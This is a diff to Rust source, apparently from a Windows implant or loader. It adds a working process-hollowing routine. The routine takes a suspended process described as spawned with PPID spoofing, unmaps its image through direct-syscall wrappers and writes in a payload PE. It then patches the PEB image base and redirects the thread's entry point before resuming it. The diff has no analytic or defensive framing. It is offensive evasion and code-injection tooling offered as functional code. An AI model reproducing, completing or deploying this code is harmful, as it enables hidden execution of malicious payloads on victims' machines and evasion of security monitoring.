@@ -4,7 +4,7 @@
 use windows_sys::Win32::{
     Foundation::CloseHandle,
     System::{
-        Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64},
+        Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT},
         Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED},
     },
 };
@@ -13,6 +13,10 @@ use windows_sys::Win32::{
 // On x64, GetThreadContext does NOT encode PEB base in any register after CREATE_SUSPENDED.
 // The correct source is NtQueryInformationProcess(ProcessBasicInformation).
 // Context is still needed to set the entry-point (Rcx) and resume the thread.
+
+// CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT for AMD64
+// windows-sys 0.52 does not export this as a named constant
+const CONTEXT_FULL_AMD64: u32 = 0x0010_000B;
 
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
@@ -297,6 +301,119 @@ pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult
         CloseHandle(pi.hThread as _);
     }
 
+    Ok(())
+}
+
+/// Variant of inject_hollow that operates on a pre-existing suspended (proc, thread) pair
+/// rather than spawning the target itself. Used by do_staged_load (Step 6) to hollow
+/// into a process that was already spawned with PPID-spoofing.
+#[cfg(target_os = "windows")]
+pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> super::InjectResult {
+    use crate::syscall::{
+        nt_alloc, nt_write, nt_protect, nt_read, nt_unmap_view, nt_resume_thread,
+        ProcessBasicInformation, nt_query_information_process,
+    };
+    use core::ptr::null_mut;
+
+    let headers = parse_pe_headers(payload_pe).ok_or("hollow_into: invalid PE")?;
+
+    // Locate the target's PEB to find and unmap its original image.
+    let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
+    let mut ret_len: u32 = 0;
+    if unsafe {
+        nt_query_information_process(
+            proc, 0,
+            &mut pbi as *mut _ as *mut u8,
+            core::mem::size_of::<ProcessBasicInformation>() as u32,
+            &mut ret_len,
+        )
+    } < 0 || pbi.peb_base_address == 0 {
+        return Err("hollow_into: NtQueryInformationProcess failed");
+    }
+    let peb = pbi.peb_base_address as u64;
+
+    let mut orig_base: u64 = 0;
+    let mut nr: usize = 0;
+    if unsafe { nt_read(proc, (peb + 0x10) as *const u8,
+                        &mut orig_base as *mut u64 as *mut u8, 8, &mut nr) } < 0 {
+        return Err("hollow_into: PEB read failed");
+    }
+
+    // Capture thread context before we touch memory (needed for entry-point redirect).
+    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
+    ctx.ContextFlags = CONTEXT_FULL_AMD64;
+    if unsafe { GetThreadContext(thread as _, &mut ctx) } == 0 {
+        return Err("hollow_into: GetThreadContext failed");
+    }
+
+    unsafe { nt_unmap_view(proc, orig_base as *mut u8) };
+
+    // Allocate space for our PE.
+    let mut new_base: *mut u8 = headers.image_base as *mut u8;
+    let mut sz: usize = headers.size_of_image as usize;
+    let new_base = if unsafe {
+        nt_alloc(proc, &mut new_base, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+    } < 0 || new_base.is_null() {
+        let mut fb: *mut u8 = null_mut();
+        if unsafe {
+            nt_alloc(proc, &mut fb, 0, &mut sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+        } < 0 || fb.is_null() {
+            return Err("hollow_into: alloc failed");
+        }
+        fb
+    } else { new_base };
+
+    // Write headers.
+    let mut w: usize = 0;
+    if unsafe { nt_write(proc, new_base, payload_pe.as_ptr(),
+                         headers.size_of_headers as usize, &mut w) } < 0 {
+        return Err("hollow_into: write headers failed");
+    }
+    // Write sections.
+    for sec in &headers.sections {
+        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
+        let end = (sec.raw_offset as usize).saturating_add(sec.raw_size as usize);
+        if end > payload_pe.len() { continue; }
+        let dst = unsafe { new_base.add(sec.virtual_address as usize) };
+        unsafe { nt_write(proc, dst, payload_pe.as_ptr().add(sec.raw_offset as usize),
+                          sec.raw_size as usize, &mut w) };
+    }
+
+    // Apply base relocations if the load address differs from the preferred base.
+    let delta = new_base as i64 - headers.image_base as i64;
+    if delta != 0 && headers.reloc_rva != 0 {
+        apply_relocations(proc, new_base, payload_pe,
+                          headers.reloc_rva, headers.reloc_size, delta);
+    }
+
+    // Set section permissions.
+    for sec in &headers.sections {
+        const MEM_X: u32 = 0x2000_0000;
+        const MEM_W: u32 = 0x8000_0000;
+        let prot = match (sec.characteristics & MEM_X != 0, sec.characteristics & MEM_W != 0) {
+            (true, _) => PAGE_EXECUTE_READ,
+            (_, true) => PAGE_READWRITE,
+            _         => PAGE_READONLY,
+        };
+        let mut sb = unsafe { new_base.add(sec.virtual_address as usize) };
+        let mut ss = sec.virtual_size as usize;
+        let mut old: u32 = 0;
+        unsafe { nt_protect(proc, &mut sb, &mut ss, prot, &mut old) };
+    }
+
+    // Patch PEB.ImageBaseAddress.
+    let nb64: u64 = new_base as u64;
+    unsafe { nt_write(proc, (peb + 0x10) as *mut u8,
+                      &nb64 as *const u64 as *const u8, 8, &mut w) };
+
+    // Redirect suspended thread entry point to our PE entry.
+    ctx.Rcx = new_base as u64 + headers.entry_point_rva as u64;
+    if unsafe { SetThreadContext(thread as _, &ctx) } == 0 {
+        return Err("hollow_into: SetThreadContext failed");
+    }
+
+    let mut sc: u32 = 0;
+    unsafe { nt_resume_thread(thread, &mut sc) };
     Ok(())
 }
 
